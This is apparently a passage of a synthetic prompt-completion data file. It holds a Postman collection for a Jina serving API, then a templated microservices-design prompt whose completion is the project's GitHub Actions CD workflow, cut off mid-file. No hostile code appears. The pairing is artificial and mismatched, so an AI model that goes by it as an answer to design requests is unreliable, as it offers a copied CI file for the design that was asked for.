],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {}\\r\\n}\",\n\t\t\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/delete\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"delete\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"Unprocessable Entity (WebDAV) (RFC 4918)\",\n\t\t\t\t\t\t\t\"code\": 422,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [],\n\t\t\t\t\t\t\t\"body\": \"{\\n    \\\"detail\\\": [\\n        {\\n            \\\"loc\\\": [\\n                \\\"string\\\"\\n            ],\\n            \\\"msg\\\": \\\"string\\\",\\n            \\\"type\\\": \\\"string\\\"\\n        }\\n    ]\\n}\"\n\t\t\t\t\t\t}\n\t\t\t\t\t]\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t\"name\": \"update\",\n\t\t\t\t\t\"request\": {\n\t\t\t\t\t\t\"method\": \"PUT\",\n\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {}\\r\\n}\",\n\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/update\",\n\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\"update\"\n\t\t\t\t\t\t\t]\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"description\": \"Post data requests to the Flow. Executors with **`@requests(on=\\\"/update\\\")`** will respond.\"\n\t\t\t\t\t},\n\t\t\t\t\t\"response\": [\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"200 - Successful Response\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"PUT\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {}\\r\\n}\",\n\t\t\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/update\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"update\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"OK\",\n\t\t\t\t\t\t\t\"code\": 200,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"expires\": \"Invalid Date\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"body\": \"{\\n    \\\"header\\\": {\\n        \\\"requestId\\\": \\\"\\\",\\n        \\\"status\\\": {\\n            \\\"code\\\": 0,\\n            \\\"description\\\": \\\"\\\",\\n            \\\"exception\\\": {\\n                \\\"name\\\": \\\"\\\",\\n                \\\"args\\\": [],\\n                \\\"stacks\\\": [],\\n                \\\"executor\\\": \\\"\\\"\\n            }\\n        },\\n        \\\"execEndpoint\\\": \\\"\\\",\\n        \\\"targetExecutor\\\": \\\"\\\",\\n        \\\"timeout\\\": 0\\n    },\\n    \\\"parameters\\\": {},\\n    \\\"routes\\\": [\\n        {\\n            \\\"executor\\\": \\\"\\\",\\n            \\\"startTime\\\": \\\"2022-04-11T14:46:23.800Z\\\",\\n            \\\"endTime\\\": \\\"2022-04-11T14:46:23.800Z\\\",\\n            \\\"status\\\": {\\n                \\\"code\\\": 0,\\n                \\\"description\\\": \\\"\\\",\\n                \\\"exception\\\": {\\n                    \\\"name\\\": \\\"\\\",\\n                    \\\"args\\\": [],\\n                    \\\"stacks\\\": [],\\n                    \\\"executor\\\": \\\"\\\"\\n                }\\n            }\\n        }\\n    ],\\n    \\\"data\\\": [\\n        {\\n            \\\"id\\\": \\\"string\\\",\\n            \\\"parent_id\\\": \\\"string\\\",\\n            \\\"granularity\\\": 0,\\n            \\\"adjacency\\\": 0,\\n            \\\"blob\\\": \\\"string\\\",\\n            \\\"tensor\\\": \\\"string\\\",\\n            \\\"mime_type\\\": \\\"string\\\",\\n            \\\"text\\\": \\\"string\\\",\\n            \\\"weight\\\": 0,\\n            \\\"uri\\\": \\\"string\\\",\\n            \\\"tags\\\": {\\n                \\\"additionalProp1\\\": true,\\n                \\\"additionalProp2\\\": true,\\n                \\\"additionalProp3\\\": true\\n            },\\n            \\\"offset\\\": 0,\\n            \\\"location\\\": [\\n                0\\n            ],\\n            \\\"embedding\\\": \\\"string\\\",\\n            \\\"modality\\\": \\\"string\\\",\\n            \\\"evaluations\\\": {\\n                \\\"additionalProp1\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp2\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp3\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                }\\n            },\\n            \\\"scores\\\": {\\n                \\\"additionalProp1\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp2\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                },\\n                \\\"additionalProp3\\\": {\\n                    \\\"value\\\": 0,\\n                    \\\"op_name\\\": \\\"string\\\",\\n                    \\\"description\\\": \\\"string\\\",\\n                    \\\"ref_id\\\": \\\"string\\\"\\n                }\\n            },\\n            \\\"chunks\\\": [\\n                \\\"string\\\"\\n            ],\\n            \\\"matches\\\": [\\n                \\\"string\\\"\\n            ]\\n        }\\n    ]\\n}\"\n\t\t\t\t\t\t},\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"422 - Validation Error\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"PUT\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"body\": {\n\t\t\t\t\t\t\t\t\t\"mode\": \"raw\",\n\t\t\t\t\t\t\t\t\t\"raw\": \"{\\r\\n  \\\"data\\\": [\\r\\n    {\\r\\n      \\\"id\\\": \\\"b590b7a9aa8d1a004cc1788bbd721c25\\\",\\r\\n      \\\"text\\\": \\\"hello, world!\\\"\\r\\n    }\\r\\n  ],\\r\\n  \\\"targetExecutor\\\": \\\"\\\",\\r\\n  \\\"parameters\\\": {}\\r\\n}\",\n\t\t\t\t\t\t\t\t\t\"options\": {\n\t\t\t\t\t\t\t\t\t\t\"raw\": {\n\t\t\t\t\t\t\t\t\t\t\t\"language\": \"json\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}/update\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\",\n\t\t\t\t\t\t\t\t\t\"path\": [\n\t\t\t\t\t\t\t\t\t\t\"update\"\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"Unprocessable Entity (WebDAV) (RFC 4918)\",\n\t\t\t\t\t\t\t\"code\": 422,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [],\n\t\t\t\t\t\t\t\"body\": \"{\\n    \\\"detail\\\": [\\n        {\\n            \\\"loc\\\": [\\n                \\\"string\\\"\\n            ],\\n            \\\"msg\\\": \\\"string\\\",\\n            \\\"type\\\": \\\"string\\\"\\n        }\\n    ]\\n}\"\n\t\t\t\t\t\t}\n\t\t\t\t\t]\n\t\t\t\t}\n\t\t\t]\n\t\t},\n\t\t{\n\t\t\t\"name\": \"Default\",\n\t\t\t\"item\": [\n\t\t\t\t{\n\t\t\t\t\t\"name\": \"Get Health of Jina Instance\",\n\t\t\t\t\t\"request\": {\n\t\t\t\t\t\t\"method\": \"GET\",\n\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}\",\n\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"port\": \"{{port}}\"\n\t\t\t\t\t\t},\n\t\t\t\t\t\t\"description\": \"Get the health of this Jina service.\"\n\t\t\t\t\t},\n\t\t\t\t\t\"response\": [\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\"name\": \"200 - Successful Response\",\n\t\t\t\t\t\t\t\"originalRequest\": {\n\t\t\t\t\t\t\t\t\"method\": \"GET\",\n\t\t\t\t\t\t\t\t\"header\": [],\n\t\t\t\t\t\t\t\t\"url\": {\n\t\t\t\t\t\t\t\t\t\"raw\": \"{{url}}:{{port}}\",\n\t\t\t\t\t\t\t\t\t\"host\": [\n\t\t\t\t\t\t\t\t\t\t\"{{url}}\"\n\t\t\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\t\t\"port\": \"{{port}}\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\"status\": \"OK\",\n\t\t\t\t\t\t\t\"code\": 200,\n\t\t\t\t\t\t\t\"_postman_previewlanguage\": \"json\",\n\t\t\t\t\t\t\t\"header\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"key\": \"Accept\",\n\t\t\t\t\t\t\t\t\t\"value\": \"application/json\",\n\t\t\t\t\t\t\t\t\t\"description\": \"\",\n\t\t\t\t\t\t\t\t\t\"type\": \"text\"\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t],\n\t\t\t\t\t\t\t\"cookie\": [],\n\t\t\t\t\t\t\t\"body\": \"{}\"\n\t\t\t\t\t\t}\n\t\t\t\t\t]\n\t\t\t\t}\n\t\t\t]\n\t\t}\n\t],\n\t\"event\": [\n\t\t{\n\t\t\t\"listen\": \"prerequest\",\n\t\t\t\"script\": {\n\t\t\t\t\"type\": \"text/javascript\",\n\t\t\t\t\"exec\": [\n\t\t\t\t\t\"\"\n\t\t\t\t]\n\t\t\t}\n\t\t},\n\t\t{\n\t\t\t\"listen\": \"test\",\n\t\t\t\"script\": {\n\t\t\t\t\"type\": \"text/javascript\",\n\t\t\t\t\"exec\": [\n\t\t\t\t\t\"\"\n\t\t\t\t]\n\t\t\t}\n\t\t}\n\t],\n\t\"variable\": [\n\t\t{\n\t\t\t\"key\": \"url\",\n\t\t\t\"value\": \"10.0.0.81\",\n\t\t\t\"type\": \"string\"\n\t\t},\n\t\t{\n\t\t\t\"key\": \"port\",\n\t\t\t\"value\": \"1234\",\n\t\t\t\"type\": \"string\"\n\t\t}\n\t]\n}", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/Jina.postman_collection.json", "language": "json", "complexity": "complex", "star_count": 21665, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 706}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CD\n\non:\n  push:\n    branches:\n      - master\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally ignore all\n\n\njobs:\n  update-schema:\n    if: |\n      !startsWith(github.event.head_commit.message, 'chore') &&\n      !startsWith(github.event.head_commit.message, 'build: hotfix') &&\n      !endsWith(github.event.head_commit.message, 'reformatted by jina-dev-bot')\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n#          submodules: true\n          fetch-depth: 100\n      - run: |\n          truncate --size=24KB README.md > README-trunc.md\n      - uses: peter-evans/dockerhub-description@v3\n        with:\n          username: ${{ secrets.DOCKERHUB_DEVBOT_USER  }}\n          password: ${{ secrets.DOCKERHUB_DEVBOT_PWD }}\n          repository: jinaai/jina\n          readme-filepath: ./README-trunc.md\n      - uses: actions/checkout@v2.5.0\n        with:\n          repository: jina-ai/api\n          path: schema\n          token: ${{ secrets.JINA_DEV_BOT }}\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.8\n      - uses: actions/setup-node@v2\n        with:\n          node-version: '14'\n      - run: |\n          pip install . --no-cache-dir\n          pip install docarray==0.21.0 # only valid for this version. I think we should remove this schema loading\n          pip install docarray==1.10.3\n          JINA_VERSION=$(sed -n '/^__version__/p' ./jina/__init__.py | cut -d \\' -f2)-master\n          echo \"JINA_VERSION=${JINA_VERSION}\" >> $GITHUB_ENV\n          cd schema\n          mkdir -p schemas\n          jina export schema --schema-path schemas/\"$JINA_VERSION.json\" schemas/master.json schemas/master --yaml-path \"$JINA_VERSION.yml\" master.yml --json-path \"$JINA_VERSION.json\" master.json master\n          python ../scripts/get-openapi-schemas.py\n          npm install --prefix ~ snippet-enricher-cli\n          ~/node_modules/.bin/snippet-enricher-cli --input=gateway.json --targets=shell_curl > gateway-with-code.json\n          cd -\n      - name: redoc-cli-gateway\n        uses: seeebiii/redoc-cli-github-action@v10\n        with:\n          args: 'bundle schema/gateway-with-code.json -o rest.html'\n      - name: push-to-api-repo\n        run: |\n          mkdir -p schema/rest/\n          cp rest.html schema/rest/master.html\n          cp schema/gateway.json schema/rest/master.json\n          rm schema/gateway.json schema/gateway-with-code.json\n          cd schema\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          if [[ `git status --porcelain` ]]; then\n            git pull && git add . && git commit -m \"update ${{env.JINA_VERSION}} due to ${{github.event_name}} on ${{github.repository}}\" && git push\n          fi\n\n  update-docker:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          workflow: Manual Docker Build\n          inputs: '{ \"release_token\": \"${{ env.release_token }}\", \"triggered_by\": \"CD\"}'\n          token: ${{ secrets.JINA_DEV_BOT }}\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n\n  prep-testbed:\n    runs-on: ubuntu-latest\n    needs: update-schema\n    env:\n      release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - id: set-matrix\n        run: |\n          sudo apt-get install jq\n          export value=$(bash scripts/get-all-test-paths.sh)\n          echo \"matrix=$value\" >> $GITHUB_OUTPUT\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n\n  docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/unit/serve/runtimes/test_helper.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/deployment_http_composite\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_singleton.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_parameters_as_pydantic.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_streaming.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/csp\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/docker\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_v2.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_errors.py\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 60\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  stateful-docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test stateful\n        id: test_stateful\n        run: |\n          JINA_LOG_LEVEL=DEBUG JINA_RANDOM_PORT_MAX=\"60535\" pytest --suppress-no-test-exit-code --maxfail 1 --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/stateful\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  mark-dev-N:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 200\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - id: computedevdelta\n        run: |\n          git fetch --depth=200\n          LAST_VER=$(git tag -l | sort -V | tail -n1)\n          COMMITS_SINCE_LAST_VER=$(git rev-list $LAST_VER..HEAD --count)\n          echo \"devdelta=$COMMITS_SINCE_LAST_VER\" >> $GITHUB_OUTPUT\n          INIT_FILE='jina/__init__.py'\n          RELEASE_VER=$(sed -n '/^__version__/p' $INIT_FILE | cut -d \\' -f2)\n          echo \"LAST_VER $LAST_VER\"\n          echo \"COMMITS_SINCE_LAST_VER $COMMITS_SINCE_LAST_VER\"\n          echo \"RELEASE_VER $RELEASE_VER\"\n          echo \"devdelta=$COMMITS_SINCE_LAST_VER\" >> $GITHUB_OUTPUT\n          echo \"releasever=$RELEASE_VER\" >> $GITHUB_OUTPUT\n    outputs:\n      devdelta: ${{ steps.computedevdelta.outputs.devdelta }}\n      releasever: ${{ steps.computedevdelta.outputs.releasever }}\n\n  # Build the wheels for Linux and macOS for Python 3.8 and newer\n  build-wheels:\n    runs-on: ${{ matrix.os }}\n    needs: [mark-dev-N]\n    strategy:\n      # Ensure that a wheel builder finishes even if another fails\n      fail-fast: false\n      matrix:\n        include:\n          # linux\n          - os: ubuntu-latest\n            python: '3.8'\n            python-manylinux-tag: \"cp38-cp38\"\n          - os: ubuntu-latest\n            python: '3.9'\n            python-manylinux-tag: \"cp39-cp39\"\n          - os: ubuntu-latest\n            python: '3.10'\n            python-manylinux-tag: \"cp310-cp310\"\n          - os: ubuntu-latest\n            python: '3.11'\n            python-manylinux-tag: \"cp311-cp311\"\n\n          # MacOS emulated\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n\n          # MacOS native\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            